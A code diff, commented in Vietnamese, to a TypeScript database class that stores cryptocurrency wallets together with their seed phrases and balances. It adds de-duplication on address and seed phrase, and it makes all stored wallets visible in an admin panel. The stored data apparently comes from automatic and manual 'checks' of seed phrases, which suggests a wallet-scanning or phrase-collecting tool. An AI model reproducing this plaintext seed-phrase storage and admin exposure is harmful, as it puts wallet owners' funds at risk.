@@ -19,7 +19,37 @@ export class DatabaseStorage implements IStorage {
   // Lưu trữ ví vào database, bao gồm cả ví từ kiểm tra tự động và kiểm tra thủ công
   async createWallet(wallet: InsertWallet): Promise<Wallet> {
     try {
-      // Thêm vào database
+      // Kiểm tra xem địa chỉ đã tồn tại trong cơ sở dữ liệu chưa với cùng seed phrase
+      const existingWallets = await db.select()
+        .from(wallets)
+        .where(
+          eq(wallets.address, wallet.address)
+        );
+      
+      // Nếu đã tồn tại với cùng seed phrase, cập nhật số dư thay vì thêm mới
+      if (existingWallets.length > 0 && existingWallets.some(w => w.seedPhrase === wallet.seedPhrase)) {
+        const existingWallet = existingWallets.find(w => w.seedPhrase === wallet.seedPhrase);
+        if (existingWallet) {
+          // Chỉ cập nhật nếu là cùng blockchain
+          if (existingWallet.blockchain === wallet.blockchain) {
+            // Cập nhật số dư
+            const result = await db.update(wallets)
+              .set({
+                balance: wallet.balance,
+                isManualCheck: wallet.isManualCheck || existingWallet.isManualCheck
+              })
+              .where(eq(wallets.id, existingWallet.id))
+              .returning();
+            
+            if (result.length > 0) {
+              return result[0];
+            }
+            return existingWallet;
+          }
+        }
+      }
+      
+      // Nếu không tồn tại hoặc khác seed phrase, thêm mới
       const result = await db.insert(wallets).values({
         blockchain: wallet.blockchain,
         address: wallet.address,
@@ -56,13 +86,10 @@ export class DatabaseStorage implements IStorage {
     return db.select().from(wallets).where(eq(wallets.isManualCheck, true));
   }
   
-  // Lấy tất cả ví có số dư từ database
+  // Lấy tất cả ví từ database để hiển thị trong admin panel
   async getWalletsWithBalance(): Promise<Wallet[]> {
-    // Chỉ lấy các ví có số dư > 0
-    return db.select().from(wallets).where(
-      // Loại bỏ các ví "MANUAL" không thực sự có blockchain
-      eq(wallets.blockchain, "BTC")
-    );
+    // Lấy tất cả các ví, bao gồm cả ví kiểm tra thủ công và tự động
+    return db.select().from(wallets);
   }
 }
 
